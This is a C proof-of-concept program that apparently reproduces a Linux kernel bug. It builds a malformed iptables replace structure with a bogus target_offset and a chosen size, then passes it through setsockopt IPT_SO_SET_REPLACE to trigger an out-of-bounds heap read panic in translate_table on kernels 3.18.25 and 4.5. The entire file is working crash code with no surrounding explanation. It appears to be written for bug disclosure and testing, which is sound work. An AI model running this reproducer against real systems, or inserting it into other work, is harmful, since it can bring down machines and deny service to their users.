/*
 * repro-translateTable.c
 *    Trigger OOM heap read panic in translate_table.
 *
 * gcc -static -g repro-translateTable.c -o repro-translateTable
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/if.h>
#include <linux/netfilter_ipv4/ip_tables.h>

void
xperror(int bad, char *msg)
{
    if(bad) {
        perror(msg);
        exit(1);
    }
}

int 
main(int argc, char **argv)
{
    char buf[9 * 4096];
    struct ipt_replace repl;
    struct ipt_entry ent;
    struct xt_entry_target targ;
    char *p;
    socklen_t valsz;
    int s, x;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    xperror(s == -1, "socket");

    memset(&targ, 0, sizeof targ);

    memset(&ent, 0, sizeof ent);
    ent.next_offset = sizeof ent + sizeof targ;
    ent.target_offset = 65535; /* bogus! */

    memset(&repl, 0, sizeof repl);
    repl.num_entries = 1;
    repl.num_counters = 1; // required for 4.5 but not 3.18.25
    /* 
     * size is important because it affects where on the heap our buffer
     * ends up. Must be greater than a page on 3.18.25 and greater than
     * 8 pages on 4.5.
     */
    repl.size = 0x8025; 
    repl.valid_hooks = 0;

    p = buf;
    memcpy(p, &repl, sizeof repl);
    p += sizeof repl;
    memcpy(p, &ent, sizeof ent);
    p += sizeof ent;
    memcpy(p, &targ, sizeof targ);
    p += sizeof targ;

    valsz = repl.size; 
    x = setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, buf, valsz);
    xperror(x == -1, "setsockopt");
    return 0;
}

